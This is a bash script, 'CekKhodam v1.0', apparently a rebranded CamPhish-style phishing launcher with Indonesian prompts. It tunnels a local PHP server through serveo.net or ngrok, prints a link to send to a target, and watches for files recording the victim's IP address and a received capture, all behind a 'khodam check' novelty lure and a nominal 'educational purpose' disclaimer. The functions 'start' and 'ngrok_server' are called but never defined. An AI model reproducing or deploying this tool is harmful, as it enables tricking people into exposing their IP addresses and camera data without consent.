#!/bin/bash
# CekKhodam v1.0
# BY Adrian Mhmd | Only Educational Purpose

trap 'printf "\n";stop' 2

banner() {
  clear
  printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
  printf "\e[1;92m |  ____||  ___  ||       | \e[0m\e[1;77m|  ____||\     /|  \e[0m\n"
  printf "\e[1;92m | |     | (   ) || () () | \e[0m\e[1;77m| |__   | )   ( |  \e[0m\n"
  printf "\e[1;92m | |     | (___) || || || | \e[0m\e[1;77m|  __|  | |   | |  \e[0m\n"
  printf "\e[1;92m | |____ |  ___  || |(_)| | \e[0m\e[1;77m| |____ | |   | |  \e[0m\n"
  printf "\e[1;92m (______|| )   ( || )   ( | \e[0m\e[1;77m|______||_|   |_|  \e[0m\n"
  printf " \e[1;77m        🔮 Cek Khodam - Only Educational Purpose 🔮 \e[0m \n\n"
  printf "\e[1;90m Generated: %s \e[0m\n\n" "$(date '+%Y-%m-%d %H:%M:%S')"
}

dependencies() {
  command -v php > /dev/null 2>&1 || { echo >&2 "PHP belum terinstall. Install dulu. Aborting."; exit 1; }
}

stop() {
  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkssh=$(ps aux | grep -o "ssh" | head -n1)
  if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
  fi
  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi
  if [[ $checkssh == *'ssh'* ]]; then
    killall -2 ssh > /dev/null 2>&1
  fi
  exit 1
}

catch_ip() {
  ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
  IFS=$'\n'
  printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP Target:\e[0m\e[1;77m %s\e[0m\n" $ip
  cat ip.txt >> saved.ip.txt
}

checkfound() {
  printf "\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Menunggu target, tekan Ctrl+C untuk keluar...\e[0m\n"
  while [ true ]; do
    if [[ -e "ip.txt" ]]; then
      printf "\n\e[1;92m[\e[0m+\e[1;92m] Target membuka link!\n"
      catch_ip
      rm -rf ip.txt
    fi

    sleep 0.5

    if [[ -e "Log.log" ]]; then
      printf "\n\e[1;92m[\e[0m+\e[1;92m] File cek khodam diterima!\e[0m\n"
      rm -rf Log.log
    fi
    sleep 0.5
  done 
}

server() {
  command -v ssh > /dev/null 2>&1 || { echo >&2 "SSH belum terinstall. Install dulu. Aborting."; exit 1; }

  printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Memulai Serveo...\e[0m\n"

  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi

  if [[ $subdomain_resp == true ]]; then
    $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
    sleep 8
  else
    $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
    sleep 8
  fi
  printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Memulai PHP server... (localhost:3333)\e[0m\n"
  fuser -k 3333/tcp > /dev/null 2>&1
  php -S localhost:3333 > /dev/null 2>&1 &
  sleep 3
  send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
  printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
}

# Versi ini mengganti teks template
select_template() {
  if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
    printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
    sleep 1
    clear
    banner
    camphish
  else
    printf "\n-----Pilih Template Cek Khodam-----\n"    
    printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Khodam Biru\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Khodam Merah\e[0m\n"
    default_option_template="1"
    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Pilih template: [Default 1] \e[0m' option_tem
    option_tem="${option_tem:-${default_option_template}}"
  fi
}

banner
dependencies
camphish() {
  printf "\n-----Pilih tunnel server----\n"    
  printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
  default_option_server="1"
  read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Pilih Port Forwarding: [Default 1] \e[0m' option_server
  option_server="${option_server:-${default_option_server}}"
  select_template
  if [[ $option_server -eq 2 ]]; then
    start
  elif [[ $option_server -eq 1 ]]; then
    ngrok_server
  else
    printf "\e[1;93m [!] Invalid option!\e[0m\n"
    sleep 1
    clear
    camphish
  fi
}

camphish
